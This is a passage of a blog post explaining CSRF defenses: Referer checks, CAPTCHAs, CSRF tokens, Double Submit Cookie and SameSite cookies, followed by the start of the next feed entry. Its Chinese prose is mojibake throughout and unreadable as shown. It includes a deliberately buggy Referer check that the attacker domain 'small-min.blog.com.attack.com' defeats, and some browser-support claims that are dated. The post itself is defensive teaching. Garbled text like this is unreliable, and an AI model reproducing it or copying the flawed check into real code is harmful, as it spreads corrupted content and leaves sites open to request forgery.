æˆ‘å€‘èˆ‰çš„ä¾‹å­æ˜¯åˆªé™¤æ–‡ç« ï¼Œé€™ä½ å¯èƒ½è¦ºå¾—æ²’ä»€éº¼ï¼Œé‚£å¦‚æœæ˜¯éŠ€è¡Œè½‰å¸³å‘¢ï¼Ÿæ”»æ“Šè€…åªè¦åœ¨è‡ªå·±çš„ç¶²é ä¸Šå¯«ä¸‹è½‰å¸³çµ¦è‡ªå·±å¸³è™Ÿçš„ codeï¼Œå†æŠŠé€™å€‹ç¶²é æ•£ä½ˆå‡ºå»å°±å¥½ï¼Œå°±å¯ä»¥æ”¶åˆ°ä¸€å¤§å †éŒ¢ã€‚
è¬›äº†é€™éº¼å¤šï¼Œä¾†è¬›è©²æ€éº¼é˜²ç¦¦å§ï¼å…ˆå¾æœ€ç°¡å–®çš„ã€Œä½¿ç”¨è€…ã€é–‹å§‹è¬›ã€‚
ä½¿ç”¨è€…çš„é˜²ç¦¦CSRF æ”»æ“Šä¹‹æ‰€ä»¥èƒ½æˆç«‹ï¼Œæ˜¯å› ç‚ºä½¿ç”¨è€…åœ¨è¢«æ”»æ“Šçš„ç¶²é æ˜¯è™•æ–¼å·²ç¶“ç™»å…¥çš„ç‹€æ…‹ï¼Œæ‰€ä»¥æ‰èƒ½åšå‡ºä¸€äº›è¡Œç‚ºã€‚é›–ç„¶èªªé€™äº›æ”»æ“Šæ‡‰è©²ç”±ç¶²é é‚£é‚Šè² è²¬è™•ç†ï¼Œä½†å¦‚æœä½ çœŸçš„å¾ˆæ€•ï¼Œæ€•ç¶²é æœƒè™•ç†ä¸å¥½çš„è©±ï¼Œä½ å¯ä»¥åœ¨æ¯æ¬¡ä½¿ç”¨å®Œç¶²ç«™å°±ç™»å‡ºï¼Œå°±å¯ä»¥é¿å…æ‰ CSRFã€‚
æˆ–è€…å‘¢ï¼Œé—œé–‰åŸ·è¡Œ js æˆ–æŠŠä¸Šé¢é€™äº› pattern çš„ç¨‹å¼ç¢¼éæ¿¾æ‰ä¸è¦åŸ·è¡Œï¼Œä¹Ÿæ˜¯ä¸€å€‹æ–¹æ³•ï¼ˆä½†æ‡‰è©²å¾ˆé›£åˆ¤å®šå“ªäº›æ˜¯ CSRF æ”»æ“Šçš„ç¨‹å¼ç¢¼ï¼‰ã€‚
æ‰€ä»¥ä½¿ç”¨è€…èƒ½åšçš„å…¶å¯¦æœ‰é™ï¼ŒçœŸçš„è©²åšäº‹çš„æ˜¯ Server é‚£é‚Šï¼
Server çš„é˜²ç¦¦CSRF ä¹‹æ‰€ä»¥å¯æ€•æ˜¯å› ç‚º CS å…©å€‹å­—ï¼šCross Siteï¼Œä½ å¯ä»¥åœ¨ä»»ä½•ä¸€å€‹ç¶²å€åº•ä¸‹ç™¼å‹•æ”»æ“Šã€‚CSRF çš„é˜²ç¦¦å°±å¯ä»¥å¾é€™å€‹æ–¹å‘æ€è€ƒï¼Œç°¡å–®ä¾†èªªå°±æ˜¯ï¼šã€Œæˆ‘è¦æ€éº¼æ“‹æ‰å¾åˆ¥çš„ domain ä¾†çš„ requestã€
ä½ ä»”ç´°æƒ³æƒ³ï¼ŒCSRF çš„ reuqest è·Ÿä½¿ç”¨è€…æœ¬äººç™¼å‡ºçš„ request æœ‰ä»€éº¼å€åˆ¥ï¼Ÿå€åˆ¥åœ¨æ–¼ domain çš„ä¸åŒï¼Œå‰è€…æ˜¯å¾ä»»æ„ä¸€å€‹ domain ç™¼å‡ºçš„ï¼Œå¾Œè€…æ˜¯å¾åŒä¸€å€‹ domain ç™¼å‡ºçš„ï¼ˆé€™é‚Šå‡è¨­ä½ çš„ api è·Ÿä½ çš„å‰ç«¯ç¶²ç«™åœ¨åŒä¸€å€‹ domainï¼‰
æª¢æŸ¥ Refererrequest çš„ header è£¡é¢æœƒå¸¶ä¸€å€‹æ¬„ä½å«åš refererï¼Œä»£è¡¨é€™å€‹ request æ˜¯å¾å“ªå€‹åœ°æ–¹éä¾†çš„ï¼Œå¯ä»¥æª¢æŸ¥é€™å€‹æ¬„ä½çœ‹æ˜¯ä¸æ˜¯åˆæ³•çš„ domainï¼Œä¸æ˜¯çš„è©±ç›´æ¥ reject æ‰å³å¯ã€‚
ä½†é€™å€‹æ–¹æ³•è¦æ³¨æ„çš„åœ°æ–¹æœ‰ä¸‰å€‹ï¼Œç¬¬ä¸€å€‹æ˜¯æœ‰äº›ç€è¦½å™¨å¯èƒ½ä¸æœƒå¸¶ refererï¼Œç¬¬äºŒå€‹æ˜¯æœ‰äº›ä½¿ç”¨è€…å¯èƒ½æœƒé—œé–‰è‡ªå‹•å¸¶ referer çš„é€™å€‹åŠŸèƒ½ï¼Œé€™æ™‚å€™ä½ çš„ server å°±æœƒ reject æ‰ç”±çœŸçš„ä½¿ç”¨è€…ç™¼å‡ºçš„ requestã€‚
ç¬¬ä¸‰å€‹æ˜¯ä½ åˆ¤å®šæ˜¯ä¸æ˜¯åˆæ³• domain çš„ç¨‹å¼ç¢¼å¿…é ˆè¦ä¿è­‰æ²’æœ‰ bugï¼Œä¾‹å¦‚ï¼š
const referer = request.headers.referer;if (referer.indexOf(&#x27;small-min.blog.com&#x27;) &gt; -1) &#123;  // pass&#125;

ä½ çœ‹å‡ºä¸Šé¢é€™æ®µçš„å•é¡Œäº†å—ï¼Ÿå¦‚æœæ”»æ“Šè€…çš„ç¶²é æ˜¯small-min.blog.com.attack.comçš„è©±ï¼Œä½ çš„æª¢æŸ¥å°±ç ´åŠŸäº†ã€‚
æ‰€ä»¥ï¼Œæª¢æŸ¥ referer ä¸¦ä¸æ˜¯ä¸€å€‹å¾ˆå®Œå–„çš„è§£æ³•
åŠ ä¸Šåœ–å½¢é©—è­‰ç¢¼ã€ç°¡è¨Šé©—è­‰ç¢¼ç­‰ç­‰å°±è·Ÿç¶²è·¯éŠ€è¡Œè½‰å¸³çš„æ™‚å€™ä¸€æ¨£ï¼Œéƒ½æœƒè¦ä½ æ”¶ç°¡è¨Šé©—è­‰ç¢¼ï¼Œå¤šäº†é€™ä¸€é“æª¢æŸ¥å°±å¯ä»¥ç¢ºä¿ä¸æœƒè¢« CSRF æ”»æ“Šã€‚
åœ–å½¢é©—è­‰ç¢¼ä¹Ÿæ˜¯ï¼Œæ”»æ“Šè€…ä¸¦ä¸çŸ¥é“åœ–å½¢é©—è­‰ç¢¼çš„ç­”æ¡ˆæ˜¯ä»€éº¼ï¼Œæ‰€ä»¥å°±ä¸å¯èƒ½æ”»æ“Šäº†ã€‚
é€™æ˜¯ä¸€å€‹å¾ˆå®Œå–„çš„è§£æ±ºæ–¹æ³•ï¼Œä½†å¦‚æœä½¿ç”¨è€…æ¯æ¬¡åˆªé™¤ blog éƒ½è¦æ‰“ä¸€æ¬¡åœ–å½¢é©—è­‰ç¢¼ï¼Œä»–å€‘æ‡‰è©²æœƒç…©æ­»å§ï¼
åŠ ä¸Š CSRF tokenè¦é˜²æ­¢ CSRF æ”»æ“Šï¼Œæˆ‘å€‘å…¶å¯¦åªè¦ç¢ºä¿æœ‰äº›è³‡è¨Šã€Œåªæœ‰ä½¿ç”¨è€…çŸ¥é“ã€å³å¯ã€‚é‚£è©²æ€éº¼åšå‘¢ï¼Ÿ
æˆ‘å€‘åœ¨ form è£¡é¢åŠ ä¸Šä¸€å€‹ hidden çš„æ¬„ä½ï¼Œå«åšcsrftokenï¼Œé€™è£¡é¢å¡«çš„å€¼ç”± server éš¨æ©Ÿç”¢ç”Ÿï¼Œä¸¦ä¸”å­˜åœ¨ server çš„ session ä¸­ã€‚
&lt;form action=&quot;https://small-min.blog.com/delete&quot; method=&quot;POST&quot;&gt;  &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;3&quot;/&gt;  &lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;fj1iro2jro12ijoi1&quot;/&gt;  &lt;input type=&quot;submit&quot; value=&quot;åˆªé™¤æ–‡ç« &quot;/&gt;&lt;/form&gt;

æŒ‰ä¸‹ submit ä¹‹å¾Œï¼Œserver æ¯”å°è¡¨å–®ä¸­çš„csrftokenèˆ‡è‡ªå·± session è£¡é¢å­˜çš„æ˜¯ä¸æ˜¯ä¸€æ¨£çš„ï¼Œæ˜¯çš„è©±å°±ä»£è¡¨é€™çš„ç¢ºæ˜¯ç”±ä½¿ç”¨è€…æœ¬äººç™¼å‡ºçš„ requestã€‚é€™å€‹ csrftoken ç”± server ç”¢ç”Ÿï¼Œä¸¦ä¸”æ¯ä¸€æ®µä¸åŒçš„ session å°±æ‡‰è©²è¦æ›´æ›ä¸€æ¬¡ã€‚
é‚£é€™å€‹ç‚ºä»€éº¼å¯ä»¥é˜²ç¦¦å‘¢ï¼Ÿå› ç‚ºæ”»æ“Šè€…ä¸¦ä¸çŸ¥é“ csrftoken çš„å€¼æ˜¯ä»€éº¼ï¼Œä¹ŸçŒœä¸å‡ºä¾†ï¼Œæ‰€ä»¥è‡ªç„¶å°±ç„¡æ³•é€²è¡Œæ”»æ“Šäº†ã€‚
å¯æ˜¯æœ‰å¦å¤–ä¸€ç¨®ç‹€æ³ï¼Œå‡è¨­ä½ çš„ server æ”¯æŒ cross origin çš„ requestï¼Œæœƒç™¼ç”Ÿä»€éº¼äº‹å‘¢ï¼Ÿæ”»æ“Šè€…å°±å¯ä»¥åœ¨ä»–çš„é é¢ç™¼èµ·ä¸€å€‹ requestï¼Œé †åˆ©æ‹¿åˆ°é€™å€‹ csrf token ä¸¦ä¸”é€²è¡Œæ”»æ“Šã€‚ä¸éå‰ææ˜¯ä½ çš„ server æ¥å—é€™å€‹ domain çš„ requestã€‚
æ¥è‘—è®“æˆ‘å€‘ä¾†çœ‹çœ‹å¦å¤–ä¸€ç¨®è§£æ³•
Double Submit Cookieä¸Šä¸€ç¨®è§£æ³•éœ€è¦ server çš„ stateï¼Œäº¦å³ csrf token å¿…é ˆè¢«ä¿å­˜åœ¨ server ç•¶ä¸­ï¼Œæ‰èƒ½é©—è­‰æ­£ç¢ºæ€§ã€‚è€Œç¾åœ¨é€™å€‹è§£æ³•çš„å¥½è™•å°±æ˜¯å®Œå…¨ä¸éœ€è¦ server å„²å­˜æ±è¥¿ã€‚
é€™å€‹è§£æ³•çš„å‰åŠæ®µèˆ‡å‰›å‰›çš„ç›¸ä¼¼ï¼Œç”± server ç”¢ç”Ÿä¸€çµ„éš¨æ©Ÿçš„ token ä¸¦ä¸”åŠ åœ¨ form ä¸Šé¢ã€‚ä½†ä¸åŒçš„é»åœ¨æ–¼ï¼Œé™¤äº†ä¸ç”¨æŠŠé€™å€‹å€¼å¯«åœ¨ session ä»¥å¤–ï¼ŒåŒæ™‚ä¹Ÿè®“ client side è¨­å®šä¸€å€‹åå« csrftoken çš„ cookieï¼Œå€¼ä¹Ÿæ˜¯åŒä¸€çµ„ tokenã€‚
Set-Cookie: csrftoken=fj1iro2jro12ijoi1&lt;form action=&quot;https://small-min.blog.com/delete&quot; method=&quot;POST&quot;&gt;  &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;3&quot;/&gt;  &lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;fj1iro2jro12ijoi1&quot;/&gt;  &lt;input type=&quot;submit&quot; value=&quot;åˆªé™¤æ–‡ç« &quot;/&gt;&lt;/form&gt;

ä½ å¯ä»¥ä»”ç´°æ€è€ƒä¸€ä¸‹ CSRF æ”»æ“Šçš„ request èˆ‡ä½¿ç”¨è€…æœ¬äººç™¼å‡ºçš„ request æœ‰ä»€éº¼ä¸ä¸€æ¨£ï¼Ÿä¸ä¸€æ¨£çš„é»å°±åœ¨æ–¼ï¼Œå‰è€…ä¾†è‡ªä¸åŒçš„ domainï¼Œå¾Œè€…ä¾†è‡ªç›¸åŒçš„ domainã€‚æ‰€ä»¥æˆ‘å€‘åªè¦æœ‰è¾¦æ³•å€åˆ†å‡ºé€™å€‹ request æ˜¯ä¸æ˜¯å¾åŒæ¨£çš„ domain ä¾†ï¼Œæˆ‘å€‘å°±å‹åˆ©äº†ã€‚
è€Œ Double Submit Cookie é€™å€‹è§£æ³•æ­£æ˜¯å¾é€™å€‹æƒ³æ³•å‡ºç™¼ã€‚
ç•¶ä½¿ç”¨è€…æŒ‰ä¸‹ submit çš„æ™‚å€™ï¼Œserver æ¯”å° cookie å…§çš„ csrftoken èˆ‡ form è£¡é¢çš„ csrftokenï¼Œæª¢æŸ¥æ˜¯å¦æœ‰å€¼ä¸¦ä¸”ç›¸ç­‰ï¼Œå°±çŸ¥é“æ˜¯ä¸æ˜¯ä½¿ç”¨è€…ç™¼çš„äº†ã€‚
ç‚ºä»€éº¼å‘¢ï¼Ÿå‡è¨­ç¾åœ¨æ”»æ“Šè€…æƒ³è¦æ”»æ“Šï¼Œä»–å¯ä»¥éš¨ä¾¿åœ¨ form è£¡é¢å¯«ä¸€å€‹ csrf tokenï¼Œé€™ç•¶ç„¶æ²’å•é¡Œï¼Œå¯æ˜¯å› ç‚ºç€è¦½å™¨çš„é™åˆ¶ï¼Œä»–ä¸¦ä¸èƒ½åœ¨ä»–çš„ domain è¨­å®š small-min.blog.com çš„ cookie å•Šï¼æ‰€ä»¥ä»–ç™¼ä¸Šä¾†çš„ request çš„ cookie è£¡é¢å°±æ²’æœ‰ csrftokenï¼Œå°±æœƒè¢«æ“‹ä¸‹ä¾†ã€‚
ç•¶ç„¶ï¼Œé€™å€‹æ–¹æ³•çœ‹ä¼¼å¥½ç”¨ï¼Œä½†ä¹Ÿæ˜¯æœ‰ç¼ºé»çš„ï¼Œå¯ä»¥åƒè€ƒï¼šDouble Submit Cookies vulnerabilitiesï¼Œæ”»æ“Šè€…å¦‚æœæŒæ¡äº†ä½ åº•ä¸‹ä»»ä½•ä¸€å€‹ subdomainï¼Œå°±å¯ä»¥å¹«ä½ ä¾†å¯« cookieï¼Œä¸¦ä¸”é †åˆ©æ”»æ“Šäº†ã€‚
client side çš„ Double Submit Cookieæœƒç‰¹åˆ¥æåˆ° client sideï¼Œæ˜¯å› ç‚ºæˆ‘ä¹‹å‰æ‰€ç¢°åˆ°çš„å°ˆæ¡ˆæ˜¯ Single Page Applicationï¼Œä¸Šç¶²æœå°‹ä¸€ä¸‹å°±æœƒç™¼ç¾æœ‰äººåœ¨å•ï¼šã€ŒSPA è©²å¦‚ä½•æ‹¿åˆ° CSRF tokenï¼Ÿã€ï¼Œé›£é“è¦ server å†æä¾›ä¸€å€‹ api å—ï¼Ÿé€™æ¨£å¥½åƒæœ‰é»æ€ªæ€ªçš„ã€‚
ä½†æ˜¯å‘¢ï¼Œæˆ‘èªç‚ºæˆ‘å€‘å¯ä»¥åˆ©ç”¨ Double Submit Cookie çš„ç²¾ç¥ä¾†è§£æ±ºé€™å€‹å•é¡Œã€‚è€Œè§£æ±ºé€™å•é¡Œçš„é—œéµå°±åœ¨æ–¼ï¼šç”± client side ä¾†ç”Ÿ csrf tokenã€‚å°±ä¸ç”¨è·Ÿ server api æœ‰ä»»ä½•çš„äº’å‹•ã€‚
å…¶ä»–çš„æµç¨‹éƒ½è·Ÿä¹‹å‰ä¸€æ¨£ï¼Œç”Ÿæˆä¹‹å¾Œæ”¾åˆ° form è£¡é¢ä»¥åŠå¯«åˆ° cookieã€‚æˆ–è€…èªªå¦‚æœä½ æ˜¯ SPA çš„è©±ï¼Œä¹Ÿå¯ä»¥æŠŠé€™è³‡è¨Šç›´æ¥æ”¾åˆ° request headerï¼Œä½ å°±ä¸ç”¨åœ¨æ¯ä¸€å€‹è¡¨å–®éƒ½åšé€™ä»¶äº‹æƒ…ï¼Œåªè¦çµ±ä¸€åŠ ä¸€å€‹åœ°æ–¹å°±å¥½ã€‚
äº‹å¯¦ä¸Šï¼Œæˆ‘è‡ªå·±å¸¸ç”¨çš„ library axios å°±æœ‰æä¾›é€™æ¨£çš„åŠŸèƒ½ï¼Œä½ å¯ä»¥è¨­ç½® header åç¨±è·Ÿ cookie åç¨±ï¼Œè¨­å®šå¥½ä»¥å¾Œä½ æ¯ä¸€å€‹ requestï¼Œå®ƒéƒ½æœƒè‡ªå‹•å¹«ä½ æŠŠ header å¡«ä¸Š cookie è£¡é¢çš„å€¼ã€‚
 // `xsrfCookieName` is the name of the cookie to use as a value for xsrf tokenxsrfCookieName: &#x27;XSRF-TOKEN&#x27;, // default// `xsrfHeaderName` is the name of the http header that carries the xsrf token valuexsrfHeaderName: &#x27;X-XSRF-TOKEN&#x27;, // default

é‚£ç‚ºä»€éº¼ç”± client ä¾†ç”Ÿé€™å€‹ token ä¹Ÿå¯ä»¥å‘¢ï¼Ÿå› ç‚ºé€™å€‹ token æœ¬èº«çš„ç›®çš„å…¶å¯¦ä¸åŒ…å«ä»»ä½•è³‡è¨Šï¼Œåªæ˜¯ç‚ºäº†ã€Œä¸è®“æ”»æ“Šè€…ã€çŒœå‡ºè€Œå·²ï¼Œæ‰€ä»¥ç”± client é‚„æ˜¯ç”± server ä¾†ç”Ÿæˆéƒ½æ˜¯ä¸€æ¨£çš„ï¼Œåªè¦ç¢ºä¿ä¸è¢«çŒœå‡ºä¾†å³å¯ã€‚Double Submit Cookie é çš„æ ¸å¿ƒæ¦‚å¿µæ˜¯ï¼šã€Œæ”»æ“Šè€…çš„æ²’è¾¦æ³•è®€å¯«ç›®æ¨™ç¶²ç«™çš„ cookieï¼Œæ‰€ä»¥ request çš„ csrf token æœƒè·Ÿ cookie å…§çš„ä¸ä¸€æ¨£ã€
browser æœ¬èº«çš„é˜²ç¦¦æˆ‘å€‘å‰›å‰›æåˆ°äº†ä½¿ç”¨è€…è‡ªå·±å¯ä»¥åšçš„äº‹ã€ç¶²é å‰å¾Œç«¯å¯ä»¥åšçš„äº‹æƒ…ï¼Œé‚£ç€è¦½å™¨å‘¢ï¼Ÿä¹‹æ‰€ä»¥èƒ½æˆç«‹ CSRFï¼Œæ˜¯å› ç‚ºç€è¦½å™¨çš„æ©Ÿåˆ¶æ‰€å°è‡´çš„ï¼Œæœ‰æ²’æœ‰å¯èƒ½å¾ç€è¦½å™¨æ–¹é¢ä¸‹æ‰‹ï¼Œä¾†è§£æ±ºé€™å€‹å•é¡Œå‘¢ï¼Ÿ
æœ‰ï¼è€Œä¸”å·²ç¶“æœ‰äº†ã€‚è€Œä¸”å•Ÿç”¨çš„æ–¹æ³•éå¸¸éå¸¸ç°¡å–®ã€‚
Google åœ¨ Chrome 51 ç‰ˆçš„æ™‚å€™æ­£å¼åŠ å…¥äº†é€™å€‹åŠŸèƒ½ï¼šSameSite cookieï¼Œå°è©³ç´°é‹è¡ŒåŸç†æœ‰èˆˆè¶£çš„å¯åƒè€ƒï¼šdraft-west-first-party-cookies-07ã€‚
å…ˆå¼•ä¸€ä¸‹ Google çš„èªªæ˜ï¼š

Same-site cookies (ne â€œFirst-Party-Onlyâ€ (ne â€œFirst-Partyâ€)) allow servers to mitigate the risk of CSRF and information leakage attacks by asserting that a particular cookie should only be sent with requests initiated from the same registrable domain.

å•Ÿç”¨é€™å€‹åŠŸèƒ½æœ‰å¤šç°¡å–®ï¼Ÿè¶…ç´šç„¡æ•µç°¡å–®ã€‚
ä½ åŸæœ¬è¨­ç½® Cookie çš„ header é•·é€™æ¨£ï¼š
Set-Cookie: session_id=ewfewjf23o1;

ä½ åªè¦åœ¨å¾Œé¢å¤šåŠ ä¸€å€‹ SameSite å°±å¥½ï¼š
Set-Cookie: session_id=ewfewjf23o1; SameSite

ä½†å…¶å¯¦ SameSite æœ‰å…©ç¨®æ¨¡å¼ï¼ŒLaxè·ŸStrictï¼Œé»˜èªæ˜¯å¾Œè€…ï¼Œä½ ä¹Ÿå¯ä»¥è‡ªå·±æŒ‡å®šæ¨¡å¼ï¼š
Set-Cookie: session_id=ewfewjf23o1; SameSite=StrictSet-Cookie: foo=bar; SameSite=Lax

æˆ‘å€‘å…ˆä¾†è«‡è«‡é»˜èªçš„ Strictæ¨¡å¼ï¼Œç•¶ä½ åŠ ä¸Š SameSite é€™å€‹é—œéµå­—ä¹‹å¾Œï¼Œå°±ä»£è¡¨èªªã€Œæˆ‘é€™å€‹ cookie åªå…è¨± same site ä½¿ç”¨ï¼Œä¸æ‡‰è©²åœ¨ä»»ä½•çš„ cross site request è¢«åŠ ä¸Šå»ã€ã€‚
æ„æ€å°±æ˜¯ä½ åŠ ä¸Šå»ä¹‹å¾Œï¼Œæˆ‘å€‘ä¸Šé¢æ‰€è¬›çš„&lt;a href=&quot;&quot;&gt;, &lt;form&gt;, new XMLHttpRequestï¼Œåªè¦æ˜¯ç€è¦½å™¨é©—è­‰ä¸æ˜¯åœ¨åŒä¸€å€‹ site åº•ä¸‹ç™¼å‡ºçš„ requestï¼Œå…¨éƒ¨éƒ½ä¸æœƒå¸¶ä¸Šé€™å€‹ cookieã€‚
å¯æ˜¯é€™æ¨£å…¶å¯¦æœƒæœ‰å€‹å•é¡Œï¼Œé€£&lt;a href=&quot;...&quot;éƒ½ä¸æœƒå¸¶ä¸Š cookie çš„è©±ï¼Œç•¶æˆ‘å¾ Google æœå°‹çµæœæˆ–è€…æ˜¯æœ‹å‹è²¼çµ¦æˆ‘çš„é€£çµé»é€²æŸå€‹ç¶²ç«™çš„æ™‚å€™ï¼Œå› ç‚ºä¸æœƒå¸¶ cookie çš„é—œä¿‚ï¼Œæ‰€ä»¥é‚£å€‹ç¶²ç«™å°±æœƒè®Šæˆæ˜¯ç™»å‡ºç‹€æ…‹ã€‚é€™æ¨£å­çš„ä½¿ç”¨è€…é«”é©—éå¸¸ä¸å¥½ã€‚
æœ‰å…©ç¨®è§£æ³•ï¼Œç¬¬ä¸€ç¨®æ˜¯è·Ÿ Amazon ä¸€æ¨£ï¼Œæº–å‚™å…©çµ„ä¸åŒçš„ cookieï¼Œç¬¬ä¸€çµ„æ˜¯è®“ä½ ç¶­æŒç™»å…¥ç‹€æ…‹ï¼Œç¬¬äºŒçµ„å‰‡æ˜¯åšä¸€äº›æ•æ„Ÿæ“ä½œçš„æ™‚å€™æœƒéœ€è¦ç”¨åˆ°çš„ï¼ˆä¾‹å¦‚èªªè³¼è²·ã€è¨­å®šå¸³æˆ¶ç­‰ç­‰ï¼‰ã€‚ç¬¬ä¸€çµ„ä¸è¨­å®š SameSiteï¼Œæ‰€ä»¥ç„¡è«–ä½ å¾å“ªé‚Šä¾†ï¼Œéƒ½æœƒæ˜¯ç™»å…¥ç‹€æ…‹ã€‚ä½†æ”»æ“Šè€…å°±ç®—æœ‰ç¬¬ä¸€çµ„ cookie ä¹Ÿä¸èƒ½å¹¹å˜›ï¼Œå› ç‚ºä¸èƒ½åšä»»ä½•æ“ä½œã€‚ç¬¬äºŒçµ„å› ç‚ºè¨­å®šäº† SameSite çš„ç·£æ•…ï¼Œæ‰€ä»¥å®Œå…¨é¿å…æ‰ CSRFã€‚
ä½†é€™æ¨£å­é‚„æ˜¯æœ‰é»å°éº»ç…©ï¼Œæ‰€ä»¥ä½ å¯ä»¥è€ƒæ…®ç¬¬äºŒç¨®ï¼Œå°±æ˜¯èª¿æ•´ç‚º SameSite çš„å¦ä¸€ç¨®æ¨¡å¼ï¼šLaxã€‚
Lax æ¨¡å¼æ”¾å¯¬äº†ä¸€äº›é™åˆ¶ï¼Œä¾‹å¦‚èªª&lt;a&gt;, &lt;link rel=&quot;prerender&quot;&gt;, &lt;form method=&quot;GET&quot;&gt; é€™äº›éƒ½é‚„æ˜¯æœƒå¸¶ä¸Š cookieã€‚ä½†æ˜¯ POST æ–¹æ³• çš„ formï¼Œæˆ–æ˜¯åªè¦æ˜¯ POST, PUT, DELETE é€™äº›æ–¹æ³•ï¼Œå°±ä¸æœƒå¸¶ä¸Š cookieã€‚
æ‰€ä»¥ä¸€æ–¹é¢ä½ å¯ä»¥ä¿æœ‰å½ˆæ€§ï¼Œè®“ä½¿ç”¨è€…å¾å…¶ä»–ç¶²ç«™é€£é€²ä½ çš„ç¶²ç«™æ™‚é‚„èƒ½å¤ ç¶­æŒç™»å…¥ç‹€æ…‹ï¼Œä¸€æ–¹é¢ä¹Ÿå¯ä»¥é˜²æ­¢æ‰ CSRF æ”»æ“Šã€‚ä½† Lax æ¨¡å¼ä¹‹ä¸‹å°±æ²’è¾¦æ³•æ“‹æ‰ GET å½¢å¼çš„ CSRFï¼Œé€™é»è¦ç‰¹åˆ¥æ³¨æ„ä¸€ä¸‹ã€‚
è¬›åˆ°é€™ç¨®æ¯”è¼ƒæ–°çš„æ±è¥¿ï¼Œç›¸ä¿¡å¤§å®¶ä¸€å®šéƒ½å¾ˆæƒ³çŸ¥é“ç€è¦½å™¨çš„æ”¯æ´åº¦å¦‚ä½•ï¼Œcaniuse å‘Šè¨´æˆ‘å€‘èªªï¼šç›®å‰åªæœ‰ Chrome æ”¯æ´é€™å€‹æ–°çš„ç‰¹æ€§ï¼ˆç•¢ç«Ÿæ˜¯ Google è‡ªå·±æ¨çš„æ–¹æ¡ˆï¼Œè‡ªå·±ç•¶ç„¶è¦æ”¯æŒä¸€ä¸‹ï¼‰ã€‚
é›–ç„¶ç€è¦½å™¨çš„æ”¯æ´åº¦ä¸å¤ªé«˜ï¼Œä½†æ—¥å¾Œå…¶ä»–ç€è¦½å™¨å¯èƒ½ä¹Ÿæœƒè·Ÿé€²å¯¦åšé€™å€‹æ–¹æ¡ˆï¼Œä¸å¦¨åœ¨ç¾åœ¨å°±æŠŠ SameSite åŠ ä¸Šå»ï¼Œä»¥å¾Œå°±ä¸ç”¨å†ç‚º CSRF ç…©æƒ±äº†ã€‚
æˆ‘å…¶å¯¦åªæ˜¯å¤§ç•¥çš„ä»‹ç´¹ä¸€ä¸‹ï¼Œdraft-west-first-party-cookies-07 è£¡é¢è¬›åˆ°å¾ˆå¤šç´°ç¯€ï¼Œä¾‹å¦‚èªªåˆ°åº•æ€æ¨£ç®—æ˜¯ cross site? ä¸€å®šè¦åœ¨åŒä¸€å€‹ domain å—ï¼Ÿé‚£ sub domain è¡Œä¸è¡Œï¼Ÿ
å¥½å¥‡çš„å¯ä»¥è‡ªå·±ç ”ç©¶ä¸€ä¸‹ï¼Œæˆ–è€…æ˜¯é€™ç¯‡ï¼šSameSite Cookieï¼Œé˜²æ­¢ CSRF æ”»å‡»ä¹Ÿæœ‰æåˆ°ã€‚
SameSite ç›¸é—œçš„åƒè€ƒè³‡æ–™ï¼š

Preventing CSRF with the same-site cookie attribute
å†è§ï¼ŒCSRFï¼šè®²è§£set-cookieä¸­çš„SameSiteå±æ€§
SameSite Cookieï¼Œé˜²æ­¢ CSRF æ”»å‡»
SameSiteâ€”â€”é˜²å¾¡ CSRF &amp; XSSI æ–°æœºåˆ¶
Cross-Site Request Forgery is dead!

ç¸½çµé€™ç¯‡ä¸»è¦ä»‹ç´¹äº† CSRF çš„æ”»æ“ŠåŸç†ä»¥åŠå…©ç¨®é˜²ç¦¦æ–¹æ³•ï¼Œé‡å°æ¯”è¼ƒå¸¸è¦‹çš„å ´æ™¯åšä»‹ç´¹ã€‚ä¸€èˆ¬åœ¨åšç¶²é é–‹ç™¼çš„æ™‚å€™ï¼Œæ¯”èµ· XSSï¼ŒCSRF æ˜¯ä¸€å€‹æ¯”è¼ƒå¸¸è¢«å¿½ç•¥çš„é‡é»ã€‚åœ¨ç¶²é ä¸Šæœ‰ä»»ä½•æ¯”è¼ƒé‡è¦çš„æ“ä½œæ™‚ï¼Œéƒ½è¦ç‰¹åˆ¥ç•™æ„æ˜¯å¦æœ‰è¢« CSRF çš„é¢¨éšªã€‚
é€™æ¬¡æ‰¾äº†å¾ˆå¤šåƒè€ƒè³‡æ–™ï¼Œä½†ç™¼ç¾è·Ÿ CSRF æœ‰é—œçš„æ–‡ç« å…¶å¯¦éƒ½å¤§åŒå°ç•°ï¼Œæƒ³çŸ¥é“æ›´ç´°ç¯€çš„åœ°æ–¹éœ€è¦èŠ±å¾ˆå¤šçš„å¿ƒåŠ›å»æ‰¾ï¼Œä½†å¹¸å¥½ Stackoverflow ä¸Šé¢ä¹Ÿæœ‰ä¸å°‘è³‡æ–™å¯ä»¥åƒè€ƒã€‚å› ç‚ºæˆ‘åœ¨è³‡è¨Šå®‰å…¨é€™å¡Šæ²’æœ‰æ¶‰çµå¤ªå¤šï¼Œå¦‚æœæ–‡ç« æœ‰å“ªéƒ¨åˆ†è¬›éŒ¯çš„è©±ï¼Œé‚„éº»ç…©å„ä½åœ¨ç•™è¨€ä¸åæŒ‡å‡ºã€‚
ä¹Ÿæ„Ÿè¬æˆ‘æœ‹å‹ shik çš„æŒ‡é»ï¼Œå‘Šè¨´æˆ‘æœ‰ SameSite é€™éº¼ä¸€å€‹æ±è¥¿ï¼Œè®“æˆ‘è£œä¸Šæœ€å¾Œä¸€æ®µã€‚
å¸Œæœ›é€™ç¯‡æ–‡ç« èƒ½è®“å¤§å®¶å° CSRF æœ‰æ›´å…¨é¢çš„èªè­˜ã€‚
åƒè€ƒè³‡æ–™
Cross-Site Request Forgery (CSRF)
Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet
ä¸€æ¬¡è¾ƒä¸ºæ·±åˆ»çš„CSRFè®¤è¯†
[æŠ€è¡“åˆ†äº«] Cross-site Request Forgery (Part 2)
Spring Security Reference
CSRF æ”»å‡»çš„åº”å¯¹ä¹‹é“

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>csrf</tag>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ CSS Grid å‰µé€ è’™å¾·é‡Œå®‰è—è¡“</title>
    <url>/2018/11/15/css-grid-art-generator/</url>
